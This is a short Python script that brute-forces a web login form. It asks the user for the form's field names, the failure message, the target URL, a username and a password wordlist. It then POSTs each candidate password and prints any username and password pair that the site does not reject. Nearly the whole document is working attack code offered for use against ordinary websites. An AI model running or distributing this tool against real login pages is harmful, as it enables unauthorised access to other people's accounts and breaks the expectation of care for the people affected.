#!/usr/bin/python

import requests
from termcolor import colored

def bruteforce(username,url):
	for password in passwords:
		password = password.strip()
		print("[!] Bruteforcing With Password: {}".format(password))
		data_dictionary = {u_para:username,p_para:password,submit_button:submit_para}
		response = requests.post(url, data=data_dictionary)
		if err_msg in response.content:
			pass
		else:
			print(colored("[+] Username => {} | Password => {}".format(username,password),'green',attrs=['bold']))
#			print(colored("[+] Password => {}".format(password),'green',attrs=['bold']))
			continue
#exit()

u_para = raw_input(colored("=> Enter UserID Name Field From Login Page: ",'blue',attrs=['bold']))
p_para = raw_input(colored("=> Enter Password Field From Login Page: ",'blue',attrs=['bold']))
submit_button = raw_input(colored("=> Enter Submit Button Name: ",'blue',attrs=['bold']))
submit_para = raw_input(colored("=> Enter Submit Button Type: ",'blue',attrs=['bold']))
err_msg = raw_input(colored("=> Write The Error Message On Wrong Password: ",'blue',attrs=['bold']))
page_url = raw_input(colored("=> Enter Login Page URL To Bruteforce: ",'blue',attrs=['bold']))
username = raw_input(colored("=> Enter Username For Specified Page: ",'blue',attrs=['bold']))
passwordfile = raw_input(colored("=> Enter The Path Of Password File: ",'blue',attrs=['bold']))
print("\n\n")

with open(passwordfile,"rb") as passwords:
	bruteforce(username,page_url)
